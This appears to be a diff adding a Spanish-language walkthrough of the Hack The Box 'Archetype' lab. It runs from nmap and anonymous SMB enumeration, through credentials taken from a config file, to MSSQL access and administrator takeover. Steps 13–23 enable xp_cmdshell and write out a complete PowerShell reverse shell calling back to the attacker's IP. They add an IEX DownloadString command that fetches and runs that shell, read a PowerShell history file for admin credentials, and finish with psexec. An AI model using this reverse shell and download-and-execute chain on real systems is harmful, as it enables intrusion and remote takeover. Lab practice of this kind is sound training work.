@@ -1,0 +1,89 @@
+HACK THE BOX
+---- PENETRATION TESTING ----
+
+STARTING PACK
+
+
+
+1- conectarse a la vpn -> openvpn tuvpn.ovpn
+2- nos dicen que escaneado la el equipo 10.10.10.27 con nmap -sC -sV -p-  encontraremos vulnerabilidades
+
+3- 	135/tcp  open  msrpc        Microsoft Windows RPC
+	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+	445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+	1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+
+	Host script results:
+	|_clock-skew: mean: 1h39m46s, deviation: 3h07m50s, median: 15m45s
+	| ms-sql-info: 
+	|   10.10.10.27:1433: 
+	|     Version: 
+	|       name: Microsoft SQL Server 2017 RTM
+	|       number: 14.00.1000.00
+	|       Product: Microsoft SQL Server 2017
+	|       Service pack level: RTM
+	|       Post-SP patches applied: false
+	|_    TCP port: 1433
+	| smb-os-discovery: 
+	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
+	|   Computer name: Archetype
+	|   NetBIOS computer name: ARCHETYPE\x00
+	|   Workgroup: WORKGROUP\x00
+	|_  System time: 2020-10-08T17:19:42-07:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+
+
+4- probamos conexion a smb --> smbclient -N -L \\\\10.10.10.27\\
+5- no dispone de seguridad y nos permite acceder.
+
+	Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+
+6- De todas las tablas hay una llamada "backup", vamos a investigar que hay ahi dentro
+7- smbclient -N \\\\10.10.10.27\\backups 
+8 - listamos el directorio para ver los archivos que contiene -> dir -> vemos el archivo de configuracion del sistema "prod.dtsConfig"
+9- descargamos una copia del archivo -> get prod.dtsConfig
+10- cat prod.dtsConfig -> <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
+11 - obtenemos las credenciales de un servidor sql del usuario local ARCHETYPE\sql_svc
+12- vamos a probar a acceder al servidor sql -> mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth  -> M3g4c0rp123
+13- estamos dentro! vamos a empezar a escalar privilegios -> 
+		EXEC sp_configure 'Show Advanced Options', 1;
+		 reconfigure;
+		 sp_configure;
+		 EXEC sp_configure 'xp_cmdshell', 1
+		 reconfigure;
+		 xp_cmdshell "whoami" 
+14- esta cuenta parece no tener permisos de administrador... vamos a probar otra cosa.
+15- Let's attempt to get a proper shell, and proceed to further enumerate the system. We can save the PowerShell reverse shell below as shell.ps1
+16- mkdir HTB-STARTING && touch /HTB-STARTING/shell.ps1 -> nano shell.ps1 -> 
+
+	$client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",443);
+	$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+	{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
+	$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
+	$stream.Flush()};$client.Close() 
+17- establecemos un servidor http -> python3 -m http.server 80
+18- otro servidor nc en el puerto 443 -> nc -lvnp 443
+19- ufw allow from 10.10.10.27 proto tcp to any port 80,443 ->use ufw to allow the call backs on port 80 and 443 to our machine.
+20- ahora podemos utilizar el comando anterior -> 
+	xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\");" 
+21- automaticamente nos conectamos con el servidor netcat -> 
+	type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+22- net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!! -> obtenemos los valores de acceso de administrador
+23- impackets > psexec.py administrator@10.10.10.27 --> MEGACORP_4dm1n
+24-  en el escritorio del administrador podemos encontrar la bandera!
+
+
+
+
+
+
+
